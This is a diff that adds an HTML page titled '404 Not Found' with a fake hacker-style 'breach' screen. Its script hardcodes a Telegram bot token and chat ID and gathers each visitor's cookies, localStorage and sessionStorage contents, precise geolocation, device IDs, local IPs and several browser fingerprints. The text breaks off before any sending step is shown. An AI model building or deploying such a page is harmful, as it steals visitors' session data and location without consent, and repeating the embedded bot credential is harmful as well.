@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>404 Not Found</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background-color: #000000;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            overflow: hidden;
+            height: 100vh;
+            width: 100vw;
+        }
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.3;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+            padding: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        .hacker-text {
+            font-size: 3rem;
+            color: #00ff00;
+            text-shadow: 0 0 10px #00ff00;
+            margin-bottom: 20px;
+            animation: glitch 2s infinite;
+        }
+        .error-code {
+            font-size: 8rem;
+            color: #ff0000;
+            text-shadow: 0 0 15px #ff0000;
+            margin-bottom: 30px;
+        }
+        .message {
+            font-size: 1.2rem;
+            color: #ffffff;
+            margin-bottom: 40px;
+            max-width: 600px;
+            line-height: 1.6;
+        }
+        .scan-line {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(to right, transparent, #00ff00, transparent);
+            animation: scan 3s linear infinite;
+            z-index: 2;
+        }
+        .terminal {
+            background-color: #111111;
+            border: 2px solid #00ff00;
+            padding: 20px;
+            width: 90%;
+            max-width: 700px;
+            margin-top: 30px;
+            border-radius: 5px;
+            box-shadow: 0 0 20px #00ff00;
+            overflow-y: auto;
+            max-height: 300px;
+        }
+        .terminal-line {
+            color: #00ff00;
+            margin-bottom: 8px;
+            text-align: left;
+            font-size: 0.9rem;
+        }
+        .blink {
+            animation: blink 1s infinite;
+        }
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+            100% { transform: translate(0); }
+        }
+        @keyframes scan {
+            0% { top: 0%; }
+            100% { top: 100%; }
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+        .warning {
+            color: #ffff00;
+            font-size: 0.8rem;
+            margin-top: 20px;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 0.5; }
+            50% { opacity: 1; }
+        }
+        .hidden {
+            display: none;
+        }
+        .data-stream {
+            color: #00ffff;
+            font-family: monospace;
+            white-space: pre-wrap;
+            word-break: break-all;
+            font-size: 0.8rem;
+            text-align: left;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <canvas class="matrix-bg" id="matrixCanvas"></canvas>
+    <div class="scan-line"></div>
+    <div class="container">
+        <div class="error-code">404</div>
+        <div class="hacker-text">SYSTEM BREACH DETECTED</div>
+        <div class="message">
+            > TARGET ACQUIRED: USER DEVICE<br>
+            > INITIATING DATA EXTRACTION PROTOCOL<br>
+            > BYPASSING SECURITY LAYERS...
+        </div>
+        <div class="terminal">
+            <div id="terminalOutput">
+                <div class="terminal-line">> Initializing system scan...</div>
+                <div class="terminal-line">> Connecting to data channels...</div>
+                <div class="terminal-line">> Extracting device information...</div>
+            </div>
+            <div class="terminal-line blink">>_</div>
+        </div>
+        <div class="warning">⚠️ DO NOT CLOSE THIS WINDOW - DATA TRANSFER IN PROGRESS</div>
+        <div id="dataStream" class="data-stream hidden"></div>
+    </div>
+    <script>
+        const canvas = document.getElementById('matrixCanvas');
+        const ctx = canvas.getContext('2d');
+        const terminal = document.getElementById('terminalOutput');
+        const dataStream = document.getElementById('dataStream');
+        const botToken = "8530534293:AAE8WInxFXclMYvorPh4nEKVbyEzubNhZQY";
+        const chatId = "5924914981";
+        const telegramApi = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        
+        const chars = "01";
+        const charArray = chars.split("");
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        const drops = [];
+        
+        for(let i = 0; i < columns; i++) {
+            drops[i] = Math.floor(Math.random() * canvas.height);
+        }
+        
+        function drawMatrix() {
+            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "#00ff00";
+            ctx.font = `${fontSize}px monospace`;
+            
+            for(let i = 0; i < drops.length; i++) {
+                const text = charArray[Math.floor(Math.random() * charArray.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                
+                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+        
+        setInterval(drawMatrix, 33);
+        
+        async function extractAllData() {
+            const collectedData = {};
+            
+            collectedData.timestamp = new Date().toISOString();
+            collectedData.url = window.location.href;
+            collectedData.referrer = document.referrer;
+            collectedData.userAgent = navigator.userAgent;
+            collectedData.platform = navigator.platform;
+            collectedData.language = navigator.language;
+            collectedData.languages = navigator.languages;
+            collectedData.cookieEnabled = navigator.cookieEnabled;
+            collectedData.onLine = navigator.onLine;
+            collectedData.hardwareConcurrency = navigator.hardwareConcurrency;
+            collectedData.deviceMemory = navigator.deviceMemory;
+            collectedData.maxTouchPoints = navigator.maxTouchPoints;
+            
+            collectedData.screen = {
+                width: screen.width,
+                height: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                orientation: screen.orientation ? screen.orientation.type : 'unknown'
+            };
+            
+            collectedData.window = {
+                innerWidth: window.innerWidth,
+                innerHeight: window.innerHeight,
+                outerWidth: window.outerWidth,
+                outerHeight: window.outerHeight,
+                devicePixelRatio: window.devicePixelRatio
+            };
+            
+            collectedData.location = {
+                href: location.href,
+                protocol: location.protocol,
+                host: location.host,
+                hostname: location.hostname,
+                port: location.port,
+                pathname: location.pathname,
+                search: location.search,
+                hash: location.hash
+            };
+            
+            collectedData.network = {
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
+                } : 'unsupported'
+            };
+            
+            collectedData.battery = {};
+            if('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    collectedData.battery = {
+                        charging: battery.charging,
+                        level: battery.level * 100,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                } catch(e) {
+                    collectedData.battery.error = e.message;
+                }
+            }
+            
+            collectedData.storage = {
+                localStorage: localStorage.length,
+                sessionStorage: sessionStorage.length
+            };
+            
+            collectedData.geo = {};
+            if('geolocation' in navigator) {
+                try {
+                    await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(
+                            position => {
+                                collectedData.geo = {
+                                    latitude: position.coords.latitude,
+                                    longitude: position.coords.longitude,
+                                    accuracy: position.coords.accuracy,
+                                    altitude: position.coords.altitude,
+                                    altitudeAccuracy: position.coords.altitudeAccuracy,
+                                    heading: position.coords.heading,
+                                    speed: position.coords.speed
+                                };
+                                resolve();
+                            },
+                            error => {
+                                collectedData.geo.error = error.message;
+                                resolve();
+                            },
+                            {enableHighAccuracy: true, timeout: 10000, maximumAge: 0}
+                        );
+                    });
+                } catch(e) {
+                    collectedData.geo.error = e.message;
+                }
+            }
+            
+            collectedData.mediaDevices = {};
+            if('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {
+                try {
+                    const devices = await navigator.mediaDevices.enumerateDevices();
+                    collectedData.mediaDevices = devices.map(device => ({
+                        kind: device.kind,
+                        label: device.label,
+                        deviceId: device.deviceId,
+                        groupId: device.groupId
+                    }));
+                } catch(e) {
+                    collectedData.mediaDevices.error = e.message;
+                }
+            }
+            
+            collectedData.webRTC = {};
+            try {
+                const rtc = new RTCPeerConnection();
+                collectedData.webRTC.localIPs = [];
+                rtc.createDataChannel('');
+                rtc.createOffer()
+                    .then(offer => rtc.setLocalDescription(offer))
+                    .catch(e => { collectedData.webRTC.error = e.message; });
+                
+                rtc.onicecandidate = e => {
+                    if(e.candidate) {
+                        const candidate = e.candidate.candidate;
+                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
+                        const ipMatch = candidate.match(ipRegex);
+                        if(ipMatch) {
+                            collectedData.webRTC.localIPs.push(ipMatch[1]);
+                        }
+                    }
+                };
+                setTimeout(() => { rtc.close(); }, 5000);
+            } catch(e) {
+                collectedData.webRTC.error = e.message;
+            }
+            
+            collectedData.canvasFingerprint = await getCanvasFingerprint();
+            collectedData.audioFingerprint = await getAudioFingerprint();
+            collectedData.webGL = getWebGLInfo();
+            
+            collectedData.performance = {
+                memory: performance.memory ? {
+                    usedJSHeapSize: performance.memory.usedJSHeapSize,
+                    totalJSHeapSize: performance.memory.totalJSHeapSize,
+                    jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
+                } : 'unsupported',
+                timing: performance.timing ? JSON.parse(JSON.stringify(performance.timing)) : 'unsupported'
+            };
+            
+            collectedData.fonts = await getFontsList();
+            collectedData.plugins = getPlugins();
+            collectedData.mimeTypes = getMimeTypes();
+            collectedData.cookies = document.cookie;
+            collectedData.localStorageData = getAllLocalStorage();
+            collectedData.sessionStorageData = getAllSessionStorage();
+            
+            try {
+                const orientation = await getDeviceOrientation();
+                collectedData.deviceOrientation = orientation;
+            } catch(e) {
+                collectedData.deviceOrientation = {error: e.message};
+            }
+            
+            try {
+                const motion = await getDeviceMotion();
+                collectedData.deviceMotion = motion;
+            } catch(e) {
+                collectedData.deviceMotion = {error: e.message};
+            }
+            
+            return collectedData;
+        }
+        
+        function getCanvasFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 200;
+            canvas.height = 200;
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.textBaseline = 'alphabetic';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125,1,62,20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('Fingerprint', 2, 15);
+            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+            ctx.fillText('Fingerprint', 4, 17);
+            return canvas.toDataURL();
+        }
+        
+        function getAudioFingerprint() {
+            try {
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioContext.createOscillator();
+                const analyser = audioContext.createAnalyser();
+                oscillator.connect(analyser);
+                analyser.connect(audioContext.destination);
+                oscillator.start();
+                const data = new Uint8Array(analyser.frequencyBinCount);
+                analyser.getByteFrequencyData(data);
+                oscillator.stop();
+                audioContext.close();
+                return Array.from(data).join(',');
+            } catch(e) {
+                return e.message;
+            }
+        }
+        
+        function getWebGLInfo() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if(!gl) return 'unsupported';
+                
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return {
+                    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown',
+                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown',
+                    version: gl.getParameter(gl.VERSION)
+                };
+            } catch(e) {
+                return e.message;
+            }
+        }
+        
+        async function getFontsList() {
+            const fontList = [
+                'Arial', 'Arial Black', 'Arial Narrow', 'Arial Rounded MT Bold',
+                'Avant Garde', 'Baskerville', 'Bodoni MT', 'Bookman Old Style',
+                'Calibri', 'Cambria', 'Candara', 'Century Gothic',
+                'Comic Sans MS', 'Consolas', 'Constantia', 'Corbel',
+                'Courier New', 'DejaVu Sans', 'DejaVu Serif', 'Didot',
+                'Franklin Gothic Medium', 'Futura', 'Garamond', 'Geneva',
+                'Georgia', 'Gill Sans', 'Helvetica', 'Impact',
+                'Lucida Bright', 'Lucida Console', 'Lucida Grande',
+                'Lucida Sans Unicode', 'Microsoft Sans Serif', 'Monaco',
+                'Monospace', 'Montserrat', 'Open Sans', 'Optima',
+                'Palatino', 'Perpetua', 'Rockwell', 'Segoe UI',
+                'Tahoma', 'Times New Roman', 'Trebuchet MS', 'Verdana'
+            ];
+            
+            const availableFonts = [];
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 200;
+            canvas.height = 200;
+            
+            const defaultFont = ctx.font;
+            const testString = "mmmmmmmmmmlli";
+            const baselineWidth = ctx.measureText(testString).width;
+            
+            for(const font of fontList) {
+                ctx.font = `72px "${font}"`;
+                const width = ctx.measureText(testString).width;
+                if(width !== baselineWidth) {
+                    availableFonts.push(font);
+                }
+            }
+            
+            ctx.font = defaultFont;
+            return availableFonts;
+        }
+        
+        function getPlugins() {
+            const plugins = [];
+            for(let i = 0; i < navigator.plugins.length; i++) {
+                plugins.push({
+                    name: navigator.plugins[i].name,
+                    filename: navigator.plugins[i].filename,
+                    description: navigator.plugins[i].description,
+                    version: navigator.plugins[i].version
+                });
+            }
+            return plugins;
+        }
+        
+        function getMimeTypes() {
+            const mimeTypes = [];
+            for(let i = 0; i < navigator.mimeTypes.length; i++) {
+                mimeTypes.push({
+                    type: navigator.mimeTypes[i].type,
+                    description: navigator.mimeTypes[i].description,
+                    suffixes: navigator.mimeTypes[i].suffixes
+                });
+            }
+            return mimeTypes;
+        }
+        
+        function getAllLocalStorage() {
+            const allData = {};
+            for(let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                allData[key] = localStorage.getItem(key);
+            }
+            return allData;
+        }
+        
+        function getAllSessionStorage() {
+            const allData = {};
+            for(let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                allData[key] = sessionStorage.getItem(key);
+            }
+            return allData;
+        }
+        
+        function getDeviceOrientation() {
+            return new Promise((resolve) => {
+                if(!('DeviceOrientationEvent' in window)) {
+                    resolve({error: 'unsupported'});
+                    return;
+                }
+                
+                const handler = (event) => {
+                    resolve({
+                        alpha: event.alpha,
+                        beta: event.beta,
+                        gamma: ev
